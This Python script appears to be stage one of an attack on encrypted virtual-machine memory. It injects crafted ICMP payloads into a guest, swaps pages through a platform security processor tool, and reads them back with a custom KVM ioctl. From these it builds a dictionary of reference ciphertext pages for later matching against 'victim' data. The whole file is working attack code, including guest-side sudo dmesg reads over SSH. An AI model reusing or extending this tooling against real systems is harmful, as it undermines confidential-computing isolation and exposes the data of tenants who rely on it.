#!/usr/bin/env python3
"""
stage1_ref_dict.py — Stage 1: Reference Dictionary & Fixed GPA Management.

Acquires / verifies FIXED_GPA and 64 reference pages (ref-16, ref-32, ref-64)
injected with normalized MURA pixel levels. Dumps the reference pages to
dict_pages_mura/ and outputs ref_dict.json for downstream stages.

Usage:
    sudo python3 stage1_ref_dict.py [--rebuild] [--output-dir .]
"""

import argparse
import ctypes
import fcntl
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c

_KVMIO = 0xAE
KVM_READ_PAGE_DUMP = (0x80000000 | ((c.PAGE_SIZE & 0x3FFF) << 16) | (_KVMIO << 8) | 0x2b)
PAYLOAD_SIZE = 8193
_ICMP_HOLD_SEC = 7.0
_last_icmp_mono: float = 0.0


def _bytes_to_xp(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, c.PAGE_SIZE, 16):
        lo = int.from_bytes(raw[i:i+8], "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{gpa+i:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(dict_gpa: int, src_gpa: int, out_path: Path,
                 swap_tool: Path = c.SWAP_TOOL_PATH,
                 kvm_dev: str = "/dev/kvm") -> None:
    """Perform PSP swap-back and read kernel dump to output file."""
    rc = subprocess.run([str(swap_tool), f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"]).returncode
    if rc != 0:
        print(f"[stage1] [!] swap_pages_tool failed (exit {rc})", file=sys.stderr)
        raise RuntimeError("swap_pages_tool failed")

    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(c.PAGE_SIZE)
        # The dump buffer is not always ready the instant the swap reports done;
        # the ioctl then returns EAGAIN. Retrying costs milliseconds, while letting
        # it propagate throws away the whole dictionary build (seen at ref 20/64).
        for attempt in range(8):
            try:
                fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
                break
            except BlockingIOError:
                if attempt == 7:
                    raise
                time.sleep(0.25 * (attempt + 1))
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(_bytes_to_xp(dict_gpa, raw) + "\n")


def _page_sig(path: Path) -> bytes:
    """Signature of a dumped ref page.

    Every ref is read back at the same FIXED_GPA, so identical ciphertext means
    identical plaintext. A misaligned ICMP probe leaves page[1] in the zero-fill
    prefix, and all such refs collapse onto one signature.
    """
    import hashlib
    return hashlib.sha256(c.parse_dump(path)).digest()


def _acquire_ref_verified(fixed_gpa: int, u8: int, out_file: Path,
                          seen_sigs: Dict[bytes, int], attempts: int = 4):
    """Acquire + dump one ref, retrying while the dump duplicates an earlier ref."""
    chunk = c.chunk16(u8, "R")
    ref_gpa = sig = None
    for a in range(attempts):
        ref_gpa = acquire_gpa(u8, chunk_bytes=chunk)
        do_swap_read(fixed_gpa, ref_gpa, out_file)
        sig = _page_sig(out_file)
        if sig not in seen_sigs:
            return ref_gpa, sig, True
        print(f"[stage1]     u8={u8}: dump duplicates u8={seen_sigs[sig]} "
              f"(attempt {a+1}/{attempts}) — ICMP alignment missed, retrying")
        time.sleep(2.0)
    print(f"[stage1] [!] u8={u8}: still duplicate after {attempts} attempts — ref unusable",
          file=sys.stderr)
    return ref_gpa, sig, False


def _checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i+1] << 8) + data[i]
    if len(data) & 1:
        s += data[-1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _send_icmp_payload(payload: bytes):
    global _last_icmp_mono
    if _last_icmp_mono > 0:
        wait = _ICMP_HOLD_SEC - (time.monotonic() - _last_icmp_mono)
        if wait > 0:
            time.sleep(wait)

    pid = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, pid, 0)
    chk = _checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", 8, 0, chk, pid, 0)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        sock.sendto(hdr + payload, ("192.168.100.2", 0))
    finally:
        sock.close()
    _last_icmp_mono = time.monotonic()


_FRAG_RE = re.compile(
    r"frag\[(\d+)\]:\s*compound_GPA=0x([0-9a-fA-F]+)\s+off=(\d+)\s+size=(\d+)")


def parse_frags(out: str) -> List[Tuple[int, int, int]]:
    """Every skb fragment of the last injection, as (compound_gpa, off, size).

    The payload is nonlinear: an 8193-byte ICMP body arrives as two fragments in
    unrelated compound pages. Reading only frag[0] — and assuming the payload runs
    into the page after it — targets a page the injection never touched, which is
    how the dictionary ended up with one usable ref.
    """
    frags: List[Tuple[int, int, int]] = []
    for m in _FRAG_RE.finditer(out):
        idx, gpa, off, size = int(m.group(1)), int(m.group(2), 16), int(m.group(3)), int(m.group(4))
        if idx == 0:
            frags = []          # a new record starts; keep only the most recent
        frags.append((gpa, off, size))
    return frags


def pick_target_page(frags: List[Tuple[int, int, int]]) -> Optional[Tuple[int, int]]:
    """A page wholly contained in one fragment, as (page_gpa, payload_offset).

    Only such a page is filled end to end with injected bytes; a page straddling a
    fragment boundary holds unrelated guest memory for part of its length and can
    never match a victim chunk there.
    """
    best: Optional[Tuple[int, int, int]] = None
    cum = 0
    for gpa, off, size in frags:
        start, end = gpa + off, gpa + off + size
        page = (start + c.PAGE_SIZE - 1) & ~(c.PAGE_SIZE - 1)
        if page + c.PAGE_SIZE <= end:
            cand = (size, page, cum + (page - start))
            if best is None or cand[0] > best[0]:
                best = cand
        cum += size
    return (best[1], best[2]) if best else None


def acquire_gpa(u8_val: Optional[int], chunk_bytes: Optional[bytes] = None, retries: int = 8) -> int:
    """Acquire page[1] GPA via ICMP injection, verifying where the payload landed.

    Retries now also cover alignment misses, not just unparseable replies, so this
    needs more attempts than the open-loop version did.
    """
    def _read_icmp():
        proc = c.ssh_run("cat /proc/large_icmp_last 2>/dev/null")
        if proc and "frag[" in proc:
            return proc
        dmesg = c.ssh_run("sudo dmesg")
        return dmesg if (dmesg and "frag[" in dmesg) else (proc or "")

    def _clear_icmp():
        c.ssh_run("echo clear | sudo tee /proc/large_icmp_last >/dev/null 2>&1; sudo dmesg -C 2>/dev/null; true")

    probe = b"\x00" * PAYLOAD_SIZE
    layout: Optional[List[Tuple[int, int, int]]] = None
    for attempt in range(retries):
        if layout is None:
            _clear_icmp()
            _send_icmp_payload(probe)
            time.sleep(1.0)
            layout = parse_frags(_read_icmp())
            if not layout:
                time.sleep(5)
                continue

        target = pick_target_page(layout)
        if target is None:
            print(f"[stage1]     no page lies wholly inside one fragment — re-probing",
                  file=sys.stderr)
            layout = None
            time.sleep(2.0)
            continue
        _, payload_off = target
        prefix = payload_off % 4          # so the page's first byte is a pattern boundary

        if u8_val is None and chunk_bytes is None:
            payload = probe               # zero payload: nothing to phase-align
        else:
            chunk = chunk_bytes if chunk_bytes is not None else c.chunk16(u8_val, "R")
            body = (chunk * (PAYLOAD_SIZE // c.CHUNK_SIZE + 2))[:PAYLOAD_SIZE - prefix]
            payload = b"\x00" * prefix + body

        _clear_icmp()
        _send_icmp_payload(payload)
        time.sleep(1.0)

        landed = parse_frags(_read_icmp())
        if not landed:
            time.sleep(2.0)
            continue
        target = pick_target_page(landed)
        if target is None:
            layout = landed
            continue
        gpa, actual_off = target

        if u8_val is None and chunk_bytes is None:
            return gpa

        # The send that actually landed decides, not the probe that predicted it.
        if actual_off >= prefix and (actual_off - prefix) % 4 == 0:
            return gpa
        print(f"[stage1]     page landed at payload offset {actual_off} "
              f"(phase {(actual_off - prefix) % 4}/4, prefix {prefix}) — retrying from it",
              file=sys.stderr)
        layout = landed

    raise RuntimeError("acquire_gpa: failed after retries")


def run_stage1(output_dir: Path, rebuild: bool = False, repair: bool = False,
               only: Optional[List[int]] = None,
               channels: Tuple[str, ...] = ("R",)) -> Dict:
    """Execute Stage 1."""
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / "ref_dict.json"

    c.ensure_guest_suppressions()
    c.ensure_mtu_9000()

    dict_dir = c.DICT_DIR
    dict_dir.mkdir(parents=True, exist_ok=True)

    cache: Dict = {"fixed_gpa": None, "refs": {}}
    if c.DICT_CACHE_FILE.exists() and not rebuild:
        try:
            cache = c.load_json(c.DICT_CACHE_FILE)
            print(f"[stage1] Loaded cache from {c.DICT_CACHE_FILE}")
        except Exception:
            pass

    # Verify or acquire FIXED_GPA
    if not cache.get("fixed_gpa") or rebuild:
        print("[stage1] Acquiring clean FIXED_GPA via Zero ICMP...")
        fixed_gpa = acquire_gpa(None)
        cache["fixed_gpa"] = hex(fixed_gpa)
        c.save_json(c.DICT_CACHE_FILE, cache)
    else:
        fixed_gpa = int(cache["fixed_gpa"], 16)
    print(f"[stage1] FIXED_GPA = 0x{fixed_gpa:x}")

    # Check available ref dumps
    available_refs = {}
    missing_refs = []
    seen_sigs: Dict[bytes, int] = {}
    for u8 in c.REF_U8_64:
        ref_file = dict_dir / f"ref_{u8:03d}.out"
        if ref_file.exists() and not rebuild:
            available_refs[str(u8)] = {
                "u8": u8,
                "file": str(ref_file),
                "ref_gpa": cache.get("refs", {}).get(str(u8), {}).get("ref_gpa", "0x0"),
            }
        else:
            missing_refs.append(u8)

    print(f"[stage1] Available ref page dumps: {len(available_refs)}/{len(c.REF_U8_64)}")

    # Drop refs whose dump duplicates another ref — they cannot discriminate.
    if repair and not rebuild:
        for u8 in list(available_refs):
            sig = _page_sig(Path(available_refs[u8]["file"]))
            if sig in seen_sigs:
                del available_refs[u8]
                missing_refs.append(int(u8))
            else:
                seen_sigs[sig] = int(u8)
        missing_refs.sort(key=c.REF_U8_64.index)
        print(f"[stage1] [repair] {len(missing_refs)} ref(s) duplicate another dump "
              f"and will be re-acquired: {missing_refs}")

    # Re-acquire named refs only, so one ref can be retried in seconds instead of
    # rebuilding all 64 to test a change.
    if only:
        missing_refs = [u for u in only if u in c.REF_U8_64]
        unknown = [u for u in only if u not in c.REF_U8_64]
        if unknown:
            print(f"[stage1] [only] not in REF_U8_64, ignored: {unknown}")
        for u in missing_refs:
            available_refs.pop(str(u), None)
        seen_sigs = {}
        for u8, meta_r in available_refs.items():
            f = Path(meta_r["file"])
            if f.exists():
                seen_sigs[_page_sig(f)] = int(u8)
        print(f"[stage1] [only] re-acquiring {missing_refs}")

    if missing_refs and (rebuild or repair or only):
        print(f"[stage1] Rebuilding {len(missing_refs)} reference dump(s)...")
        for idx, u8 in enumerate(missing_refs):
            out_file = dict_dir / f"ref_{u8:03d}.out"
            ref_gpa, sig, ok = _acquire_ref_verified(fixed_gpa, u8, out_file, seen_sigs)
            print(f"  [{idx+1}/{len(missing_refs)}] u8={u8:3d} GPA=0x{ref_gpa:x} "
                  f"→ {out_file.name}{'' if ok else '  [UNUSABLE]'}")
            if ok:
                seen_sigs[sig] = u8
            time.sleep(1.0)
            available_refs[str(u8)] = {
                "u8": u8,
                "file": str(out_file),
                "ref_gpa": hex(ref_gpa),
                "verified": ok,
            }
            cache.setdefault("refs", {})[str(u8)] = {
                "ref_gpa": hex(ref_gpa),
                "fixed_gpa": hex(fixed_gpa),
                "file": str(out_file),
                "verified": ok,
            }
            c.save_json(c.DICT_CACHE_FILE, cache)

    # Post-build audit: every usable ref must have a unique dump.
    audit: Dict[bytes, List[int]] = {}
    for u8 in c.REF_U8_64:
        f = dict_dir / f"ref_{u8:03d}.out"
        if f.exists():
            audit.setdefault(_page_sig(f), []).append(u8)
    dup_groups = [v for v in audit.values() if len(v) > 1]
    unusable = sorted(u for g in dup_groups for u in g)
    if unusable:
        print(f"[stage1] [!] {len(unusable)} ref(s) still duplicate — dictionary is degraded: {unusable}",
              file=sys.stderr)
    else:
        print(f"[stage1] Audit OK — all {len(audit)} ref dumps are distinct.")

    meta = {
        "stage": 1,
        "fixed_gpa": hex(fixed_gpa),
        "fixed_gpa_int": fixed_gpa,
        "num_refs": len(c.REF_U8_64),
        "available_refs_count": len(available_refs),
        "usable_refs_count": len(c.REF_U8_64) - len(unusable),
        "unusable_refs": unusable,
        "ref_list": c.REF_U8_64,
        "dict_dir": str(dict_dir),
        "timestamp": time.time(),
    }
    c.save_json(json_path, meta)
    print(f"[stage1] Saved reference dictionary metadata → {json_path}")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--rebuild", action="store_true", help="Force rebuilding ref dictionary via ICMP")
    p.add_argument("--repair", action="store_true",
                   help="Re-acquire only the refs whose dump duplicates another ref")
    p.add_argument("--only", default=None,
                   help="Comma-separated u8 values to re-acquire (e.g. 66,63,64)")
    p.add_argument("--output-dir", default=str(HERE), help="Directory to save ref_dict.json")
    args = p.parse_args()

    only = [int(x) for x in args.only.split(",")] if args.only else None
    run_stage1(Path(args.output_dir), rebuild=args.rebuild, repair=args.repair, only=only)


if __name__ == "__main__":
    main()
